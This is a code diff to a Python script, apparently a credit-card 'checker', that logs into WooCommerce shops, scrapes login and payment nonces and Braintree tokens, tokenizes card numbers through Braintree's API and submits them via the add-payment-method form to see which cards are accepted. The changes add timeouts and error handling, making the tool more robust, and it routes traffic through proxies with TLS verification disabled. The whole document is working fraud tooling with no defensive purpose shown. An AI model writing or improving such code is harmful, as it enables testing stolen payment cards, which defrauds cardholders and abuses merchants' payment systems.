@@ -35,22 +35,30 @@ class BraintreeLoginChecker:
     def login(self, domain, username, password):
         login_url = f"{domain}/my-account/"
         
-        response = self.session.get(login_url, headers=self.headers, proxies=self.proxies, verify=False)
-        
+        try:
+            response = self.session.get(login_url, headers=self.headers, proxies=self.proxies, verify=False, timeout=15)
+        except Exception as e:
+            return False, f"Connection failed: {str(e)}"
+
         if response.status_code != 200:
-            return False, "Failed to get login page"
+            return False, f"Failed to get login page (Status: {response.status_code})"
         
-        soup = BeautifulSoup(response.text, 'html.parser')
+        # Check if text exists to avoid NoneType errors
+        response_text = response.text if response.text else ""
+        
+        soup = BeautifulSoup(response_text, 'html.parser')
         nonce_input = soup.find("input", {"name": "woocommerce-login-nonce"})
         
+        login_nonce = None
         if not nonce_input:
-            match = re.search(r'name="woocommerce-login-nonce" value="([^"]+)"', response.text)
+            match = re.search(r'name="woocommerce-login-nonce" value="([^"]+)"', response_text)
             if match:
                 login_nonce = match.group(1)
-            else:
-                return False, "Login nonce not found"
         else:
             login_nonce = nonce_input.get("value")
+        
+        if not login_nonce:
+            return False, "Login nonce not found in page source"
         
         login_data = {
             'username': username,
@@ -67,12 +75,20 @@ class BraintreeLoginChecker:
             'Origin': domain
         })
         
-        login_response = self.session.post(login_url, headers=login_headers, data=login_data, proxies=self.proxies, verify=False)
-        
-        if "Log out" in login_response.text or "My Account" in login_response.text or "Dashboard" in login_response.text:
+        try:
+            login_response = self.session.post(login_url, headers=login_headers, data=login_data, proxies=self.proxies, verify=False, timeout=15)
+        except Exception as e:
+            return False, f"Post login failed: {str(e)}"
+            
+        # Safely check response text
+        login_text = login_response.text if login_response.text else ""
+
+        # Check for success indicators
+        if "Log out" in login_text or "My Account" in login_text or "Dashboard" in login_text:
             return True, self.session
         else:
-            return False, "Login failed"
+            # Return a snippet of the response for debugging if login fails
+            return False, "Login failed - Invalid credentials or redirect loop"
     
     def get_auth_tokens(self, domain, use_known_token=True):
         payment_url = f"{domain}/my-account/add-payment-method/"
@@ -80,13 +96,18 @@ class BraintreeLoginChecker:
         headers = self.headers.copy()
         headers['Referer'] = f"{domain}/my-account/"
         
-        response = self.session.get(payment_url, headers=headers, proxies=self.proxies, verify=False)
+        try:
+            response = self.session.get(payment_url, headers=headers, proxies=self.proxies, verify=False, timeout=15)
+        except Exception as e:
+            return None, None, f"Connection error fetching payment page: {str(e)}"
         
         if response.status_code != 200:
-            return None, None, "Failed to get payment page"
+            return None, None, f"Failed to get payment page (Status: {response.status_code})"
         
+        response_text = response.text if response.text else ""
+
         add_nonce = None
-        match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', response.text)
+        match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', response_text)
         if match:
             add_nonce = match.group(1)
         else:
@@ -105,7 +126,7 @@ class BraintreeLoginChecker:
             ]
             
             for pattern in patterns:
-                matches = re.findall(pattern, response.text, re.IGNORECASE)
+                matches = re.findall(pattern, response_text, re.IGNORECASE)
                 if matches:
                     for match in matches:
                         if len(match) > 100:
@@ -121,7 +142,7 @@ class BraintreeLoginChecker:
                                     break
             
             if not auth_token:
-                soup = BeautifulSoup(response.text, 'html.parser')
+                soup = BeautifulSoup(response_text, 'html.parser')
                 scripts = soup.find_all('script')
                 for script in scripts:
                     if script.string:
@@ -171,20 +192,27 @@ class BraintreeLoginChecker:
             'user-agent': self.headers['User-Agent']
         }
         
-        response = requests.post(
-            'https://payments.braintree-api.com/graphql',
-            headers=token_headers,
-            json=json_data,
-            proxies=self.proxies,
-            verify=False
-        )
+        try:
+            response = requests.post(
+                'https://payments.braintree-api.com/graphql',
+                headers=token_headers,
+                json=json_data,
+                proxies=self.proxies,
+                verify=False,
+                timeout=15
+            )
+        except Exception as e:
+            return None
         
         if response.status_code == 200:
-            token_data = response.json()
-            if 'data' in token_data and 'tokenizeCreditCard' in token_data['data']:
-                token = token_data['data']['tokenizeCreditCard']['token']
-                return token
-            elif 'errors' in token_data:
+            try:
+                token_data = response.json()
+                if 'data' in token_data and 'tokenizeCreditCard' in token_data['data']:
+                    token = token_data['data']['tokenizeCreditCard']['token']
+                    return token
+                elif 'errors' in token_data:
+                    return None
+            except json.JSONDecodeError:
                 return None
         return None
     
@@ -212,7 +240,7 @@ class BraintreeLoginChecker:
             'woocommerce_add_payment_method': '1',
         }
         
-        response = self.session.post(payment_url, headers=submit_headers, data=data, proxies=self.proxies, verify=False)
+        response = self.session.post(payment_url, headers=submit_headers, data=data, proxies=self.proxies, verify=False, timeout=20)
         
         return response
 
@@ -263,7 +291,8 @@ def check_card(cc_line):
         response = checker.submit_payment(domain, add_nonce, token)
         
         # 6. Parse Response
-        soup = BeautifulSoup(response.text, 'html.parser')
+        response_text = response.text if response.text else ""
+        soup = BeautifulSoup(response_text, 'html.parser')
         
         success_div = soup.find('div', class_='woocommerce-message')
         error_div = soup.find('div', class_='woocommerce-error')
